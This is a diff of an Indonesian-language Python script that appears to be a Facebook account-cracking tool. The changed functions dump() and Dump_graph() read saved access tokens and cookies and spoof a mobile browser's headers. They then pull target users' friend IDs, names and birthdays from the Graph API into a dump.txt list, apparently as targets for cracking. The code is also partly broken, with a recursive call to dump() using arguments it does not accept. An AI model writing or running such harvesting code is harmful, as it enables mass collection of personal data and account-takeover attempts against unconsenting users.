@@ -317,50 +317,49 @@ def crack_file():
     setting()
 ###----------[ DUMP ID PUBLIK ]----------###
 
-#def dump
-
 def dump():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cookie.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		print(f"\nPastikan ID Target ngga perivat")
-		jum = int(input(f'Ingin Dump Berapa ID : '))
-	except ValueError:
-		print(f'input salah ')
-		exit()
-	if jum<1 or jum>100:
-		print(f'gagal dump id kemungkinan id bukan publik/private ')
-		exit()
-	ses=requests.Session()
-	jumlah_input = 0
-	for met in range(jum):
-		jumlah_input+=1
-		user_dump = input(f'masukan id ke '+str(jumlah_input)+' : ')
-		uid.append(user_dump)
-	for userr in uid:
-		try:
-			col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
-			for x in col['friends']['data']:
-				try:
-					sys.stdout.write(f"\rtunggu sedang dump id... {len(id)} "),
-					sys.stdout.flush()
-					id.append(x['id']+'|'+x['name'])
-				except:continue
-		except (KeyError,IOError):
-			pass
-		except requests.exceptions.ConnectionError:
-			print(f'koneksi sinyal tidak stabil ')
-			exit()
-	try:
-		print('')
-		setting()
-	except requests.exceptions.ConnectionError:
-		print('')
-		print(f'koneksi sinyal tidak stabil ')
-		dump()
+    try:
+        token = open('.token.txt', 'r').read()
+        cok = open('.cookie.txt', 'r').read()
+    except IOError:
+        print('cookies mu terkena cp')
+        time.sleep(5)
+        Login_lagi()
+    fields =''
+    idt = input(f'[{H}>{N}] Masukan Idz Target : ')
+    try:
+        headers = {
+            "connection": "keep-alive", 
+            "accept": "*/*", 
+            "sec-fetch-dest": "empty", 
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin", 
+            "sec-fetch-user": "?1",
+            "sec-ch-ua-mobile": "?1",
+            "upgrade-insecure-requests": "1", 
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+            "accept-encoding": "gzip, deflate",
+            "accept-language": "id-ID,id;q=0.9"
+        }
+        if len(id) == 0:
+            params = {
+                "access_token": token,
+                "fields": f"name,friends.fields(id,name,birthday)"
+            }
+        else:
+            params = {
+                "access_token": token,
+                "fields": f"name,friends.fields(id,name,birthday).after({fields})"
+            }
+        url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cok).json()
+        for i in url["friends"]["data"]:
+            id.append(i["id"]+"|"+i["name"])
+            sys.stdout.write(f"\r[{H}>{N}] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
+            sys.stdout.flush()
+        dump(idt,url["friends"]["paging"]["cursors"]["after"],cok,token)
+    except:pass
+    # setting()
+    
 
 ###----------[ ATUR SBLUM KREK ]----------###
 def setting():
@@ -655,7 +654,6 @@ def CreatePage(name:str, category:list, token:str):
     else:
         print('Failed Create Page!')
 
-
 def Dump_graph():
     loop = 0
     id_list = []  # Mendeklarasikan variabel id_list
@@ -666,31 +664,38 @@ def Dump_graph():
         exit()
 
     pil = input('[ > ] masukan id (pisahkan dengan koma): ')
-    limit = input('[ > ] masukan limit : ')
     ids = pil.split(',')  # Memisahkan ID yang dimasukkan berdasarkan koma
     for id_input in ids:
         try:
             params = {
                 "access_token": token,
-                "fields": "name,friends.fields(id,name,birthday)"
+                "fields": "friends.limit(99999)"  # Membatasi jumlah teman yang diambil
             }
-            koH = requests.get('https://graph.facebook.com/v2.0/' + id_input.strip() +
-                               '?fields=friends.limit({limit})&access_token=' +
-                               token,
-                               params=params,
-                               cookies={'cookie': kukis}).json()
-            for pi in koH['friends']['data']:
-                try:
-                    id_list.append(pi['id'] + '|' + pi['name'])  # Menambahkan id ke id_list
-                    print('%s|%s'%(pi['id'],pi['name']))
-                    open('dump.txt','a').write('\n' + pi['id']+ '|' + pi['name'])  # Menulis id ke file dump.txt
-                    loop += 1
-                except Exception as e:
-                    print("Error:", e)
+            response = requests.get(
+                f'https://graph.facebook.com/v12.0/{id_input.strip()}',  # Perbarui ke v12.0
+                params=params,
+                cookies={'cookie': kukis}
+            ).json()
+            if 'friends' in response and 'data' in response['friends']:
+                for pi in response['friends']['data']:
+                    try:
+                        id_list.append(pi['id'] + '|' + pi['name'])  
+                        print(f'{pi["id"]}|{pi["name"]}')
+                        with open('dump.txt', 'a') as file:
+                            file.write(f'\n{pi["id"]}|{pi["name"]}')
+                        loop += 1
+                    except Exception as e:
+                        print(f"Error processing friend data: {e}")
+            else:
+                print("No friends data found.")
+
+            if 'friends' in response and 'summary' in response['friends']:
+                total_friends = response['friends']['summary']['total_count']
+                print(f"Total friends for {id_input.strip()}: {total_friends}")
+
         except Exception as e:
-            print("Error:", e)
-
-
+            print(f"Error with ID {id_input.strip()}: {e}")
+    
 import os, sys, random, json, re, concurrent
 from concurrent.futures import ThreadPoolExecutor
 
